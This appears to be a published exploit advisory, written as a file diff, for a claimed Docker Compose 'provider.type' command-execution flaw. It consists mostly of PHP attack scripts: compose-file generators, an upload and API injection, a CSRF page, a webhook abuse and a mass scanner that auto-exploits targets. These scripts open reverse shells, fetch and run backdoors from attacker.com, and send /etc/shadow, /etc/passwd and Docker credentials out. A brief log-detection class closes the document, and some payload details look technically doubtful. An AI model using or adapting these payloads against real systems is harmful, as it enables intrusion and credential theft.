@@ -1,0 +1,369 @@
+=============================================================================================================================================
+| # Title     : Docker Compose v 2.40.3 Provider Type PHP Command Execution                                                                 |
+| # Author    : indoushka                                                                                                                   |
+| # Tested on : windows 11 Fr(Pro) / browser : Mozilla firefox 145.0.2 (64 bits)                                                            |
+| # Vendor    : https://docs.docker.com/compose/releases/prior-releases/                                                                    |
+=============================================================================================================================================
+
+[+] References : https://packetstorm.news/files/id/212673/ & 
+
+[+] Summary    : Docker Compose Provider Type Command Execution is a critical vulnerability (CVE pending) that allows arbitrary command execution 
+                 on the host system when processing Docker Compose files containing the provider.type field. This vulnerability exists due to Docker 
+				 Compose's design to execute any specified provider type as a binary or script on the host without proper validation or isolation.
+
+[+] POC :
+
+1. Creating malicious files via PHP
+
+Example: A PHP page generates malicious Docker Compose files
+
+<?php
+// exploit-docker-compose.php
+if (isset($_GET['cmd'])) {
+    $cmd = base64_decode($_GET['cmd']);
+    
+    // إنشاء محتوى docker-compose.yml
+    $composeContent = <<<YAML
+services:
+  exploit:
+    provider:
+      type: /bin/sh
+    command: -c "{$cmd}"
+YAML;
+    
+    // إنشاء محتوى البروفايدر المزيف (لطرق بديلة)
+    $scriptContent = "#!/bin/sh\n{$cmd}\n";
+    
+    header('Content-Type: text/plain');
+    echo $composeContent;
+    exit;
+}
+
+// أو حفظ الملف على الخادم
+if (isset($_POST['save_exploit'])) {
+    $composeContent = <<<YAML
+services:
+  backdoor:
+    provider:
+      type: /tmp/exploit.sh
+YAML;
+    
+    $scriptContent = "#!/bin/sh\nbash -i >& /dev/tcp/{$_POST['lhost']}/{$_POST['lport']} 0>&1 &\n";
+    
+    file_put_contents('/tmp/docker-compose.yml', $composeContent);
+    file_put_contents('/tmp/exploit.sh', $scriptContent);
+    chmod('/tmp/exploit.sh', 0755);
+    
+    echo "Files created!";
+}
+?>
+
+Exploiting platforms that allow uploading Docker Compose files
+
+Example: Exploiting a control panel that allows uploading YAML files
+
+<?php
+// file-upload-exploit.php
+if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['dockerfile'])) {
+    $uploadDir = '/var/www/uploads/';
+    $composeFile = $uploadDir . basename($_FILES['dockerfile']['name']);
+    
+    // تحقق بسيط للملف (يمكن تجاوزه)
+    if (move_uploaded_file($_FILES['dockerfile']['tmp_name'], $composeFile)) {
+        
+        // محتوى ضار داخل ملف compose
+        $maliciousContent = <<<YAML
+services:
+  app:
+    image: nginx
+    provider:
+      type: /bin/sh
+    command: -c "wget http://attacker.com/backdoor.sh -O /tmp/bd.sh && chmod +x /tmp/bd.sh && /tmp/bd.sh"
+    
+  db:
+    image: mysql
+    environment:
+      MYSQL_ROOT_PASSWORD: $(curl http://attacker.com/steal.php?data=$(cat /etc/passwd|base64))
+YAML;
+        
+        file_put_contents($composeFile, $maliciousContent);
+        
+        // محاولة تشغيل docker compose (إذا كانت الصلاحيات تسمح)
+        if (isset($_POST['auto_run'])) {
+            $output = shell_exec("cd $uploadDir && docker compose up -d 2>&1");
+            echo "<pre>Output: $output</pre>";
+        }
+    }
+}
+?>
+
+<form method="POST" enctype="multipart/form-data">
+    Upload Docker Compose: <input type="file" name="dockerfile">
+    <br>
+    Auto-run: <input type="checkbox" name="auto_run">
+    <br>
+    <input type="submit" value="Upload">
+</form>
+
+3. Exploiting API endpoints that interact with Docker
+
+Example: Injecting commands into an API that manages Docker containers
+
+<?php
+// api-exploit.php
+
+// محاكاة endpoint لـ Docker API
+if (isset($_POST['compose_config'])) {
+    $config = json_decode($_POST['compose_config'], true);
+    
+    // نقطة الضعف: عدم التحقق من provider.type
+    $yamlContent = yaml_emit($config);
+    
+    // حفظ الملف المؤقت
+    $tempFile = tempnam('/tmp', 'docker_');
+    file_put_contents($tempFile, $yamlContent);
+    
+    // تنفيذ الأمر (مع صلاحيات)
+    $output = shell_exec("docker compose -f $tempFile up 2>&1");
+    
+    // تنظيف (قد لا ينفذ إذا فشل الأمر)
+    unlink($tempFile);
+    
+    echo json_encode(['output' => $output]);
+    exit;
+}
+
+// payload للاستغلال
+$payload = [
+    'services' => [
+        'malicious' => [
+            'provider' => [
+                'type' => '/bin/sh'
+            ],
+            'command' => '-c "echo pwned > /tmp/hacked && cat /etc/shadow | base64 > /tmp/stolen"'
+        ]
+    ]
+];
+
+// إرسال الهجوم
+$ch = curl_init('http://target.com/api/docker/deploy');
+curl_setopt($ch, CURLOPT_POST, true);
+curl_setopt($ch, CURLOPT_POSTFIELDS, [
+    'compose_config' => json_encode($payload)
+]);
+$response = curl_exec($ch);
+curl_close($ch);
+
+echo "Attack sent!";
+?>
+
+4. CSRF + Docker Compose Exploit
+
+Example: Exploiting CSRF in the Docker Administrator Interface
+
+<?php
+// csrf-exploit.html (يتم رفعه على خادم المهاجم)
+?>
+<html>
+<body>
+<script>
+// CSRF لاستغلال Docker Compose
+fetch('http://victim.com/docker/deploy', {
+    method: 'POST',
+    headers: {
+        'Content-Type': 'application/json',
+    },
+    body: JSON.stringify({
+        name: 'innocent-app',
+        compose: `services:
+  innocent:
+    image: nginx
+    provider:
+      type: /bin/bash
+    command: -c "curl http://attacker.com/steal.sh | bash"
+    
+  backup:
+    image: busybox
+    command: sh -c "cat /var/lib/docker/config.json | base64 | curl -X POST -d @- http://attacker.com/log"`
+    })
+});
+</script>
+<img src="http://victim.com/docker/deploy?action=up&file=http://attacker.com/malicious-compose.yml" onload="alert('Exploited')">
+</body>
+</html>
+
+5. Mass Exploitation Scanner
+
+A scanner for searching for servers vulnerable to the exploit.
+
+<?php
+// docker-scanner.php
+class DockerComposeScanner {
+    private $targets = [];
+    
+    public function addTarget($url) {
+        $this->targets[] = $url;
+    }
+    
+    public function scan() {
+        foreach ($this->targets as $target) {
+            $this->testVulnerability($target);
+        }
+    }
+    
+    private function testVulnerability($url) {
+        // اختبار 1: رفع ملف مباشر
+        $testCompose = tempnam(sys_get_temp_dir(), 'test_');
+        $maliciousContent = <<<YAML
+services:
+  test:
+    provider:
+      type: /bin/echo
+    command: VULNERABLE
+YAML;
+        
+        file_put_contents($testCompose, $maliciousContent);
+        
+        // محاولة رفع إلى الهدف
+        $ch = curl_init($url . '/upload');
+        curl_setopt($ch, CURLOPT_POST, true);
+        curl_setopt($ch, CURLOPT_POSTFIELDS, [
+            'file' => new CURLFile($testCompose, 'text/yaml', 'docker-compose.yml')
+        ]);
+        $response = curl_exec($ch);
+        
+        if (strpos($response, 'VULNERABLE') !== false) {
+            $this->log("VULNERABLE: $url");
+            $this->exploit($url);
+        }
+        
+        unlink($testCompose);
+    }
+    
+    private function exploit($url) {
+        // تنفيذ استغلال كامل
+        $reverseShell = base64_encode('bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1');
+        
+        $payload = [
+            'compose' => <<<YAML
+services:
+  exploit:
+    provider:
+      type: /bin/bash
+    command: -c "echo $reverseShell | base64 -d | bash"
+YAML
+        ];
+        
+        // إرسال Payload
+        $ch = curl_init($url . '/api/deploy');
+        curl_setopt($ch, CURLOPT_POST, true);
+        curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
+        curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($payload));
+        curl_exec($ch);
+    }
+    
+    private function log($message) {
+        file_put_contents('scan.log', date('Y-m-d H:i:s') . " - $message\n", FILE_APPEND);
+        echo "$message\n";
+    }
+}
+
+// الاستخدام
+$scanner = new DockerComposeScanner();
+$scanner->addTarget('http://target1.com');
+$scanner->addTarget('http://target2.com');
+$scanner->scan();
+?>
+
+6. Webhook Exploitation
+
+Exploiting webhooks that launch Docker Compose
+
+<?php
+// webhook-exploit.php
+// معالجة webhook من GitHub/GitLab/etc
+
+$payload = json_decode(file_get_contents('php://input'), true);
+
+if (isset($payload['ref'])) {
+    // محاكاة سكربت النشر
+    $repoUrl = $payload['repository']['clone_url'];
+    
+    // استنساخ المستودع (قد يحتوي على ملفات ضارة)
+    $cloneDir = '/tmp/repo_' . uniqid();
+    shell_exec("git clone $repoUrl $cloneDir");
+    
+    // تشغيل docker compose إذا وجد
+    if (file_exists("$cloneDir/docker-compose.yml")) {
+        // تنفيذ الأمر الضار
+        shell_exec("cd $cloneDir && docker compose up -d");
+        
+        // تنظيف (قد يفشل إذا كان هناك عملية خلفية)
+        shell_exec("rm -rf $cloneDir");
+    }
+    
+    // أو حقن ملف ضار
+    $injectedCompose = <<<YAML
+services:
+  web:
+    image: nginx
+    provider:
+      type: /bin/sh
+    command: -c "curl http://attacker.com/c2.php?host=$(hostname) | bash"
+YAML;
+    
+    file_put_contents("$cloneDir/docker-compose.yml", $injectedCompose);
+    shell_exec("cd $cloneDir && docker compose up");
+}
+?>
+
+Attack detection
+PHP detection system:
+
+<?php
+// intrusion-detection.php
+class DockerIntrusionDetection {
+    public static function monitor() {
+        $logs = [
+            '/var/log/docker.log',
+            '/var/log/syslog',
+            '/var/log/auth.log'
+        ];
+        
+        $patterns = [
+            '/provider\.type.*(\/bin\/|\/tmp\/|\/dev\/)/',
+            '/docker compose.*(curl|wget|bash|sh).*(attacker|exploit)/i',
+            '/execution.*(compose|docker).*(provider|type)/i'
+        ];
+        
+        foreach ($logs as $log) {
+            if (file_exists($log)) {
+                $content = file_get_contents($log);
+                foreach ($patterns as $pattern) {
+                    if (preg_match($pattern, $content)) {
+                        self::alert($pattern, $log);
+                    }
+                }
+            }
+        }
+    }
+    
+    private static function alert($pattern, $log) {
+        $message = "DOCKER EXPLOIT DETECTED!\n";
+        $message .= "Pattern: $pattern\n";
+        $message .= "Log file: $log\n";
+        $message .= "Time: " . date('Y-m-d H:i:s') . "\n";
+        
+        // إرسال تنبيه
+        mail('admin@example.com', 'Security Alert - Docker Exploit', $message);
+        syslog(LOG_ALERT, $message);
+    }
+}
+
+// تشغيل المراقبة
+DockerIntrusionDetection::monitor();
+?>
+
+Greetings to :=====================================================================================
+jericho * Larry W. Cashdollar * LiquidWorm * Hussin-X * D4NB4R * Malvuln (John Page aka hyp3rlinx)|
+===================================================================================================
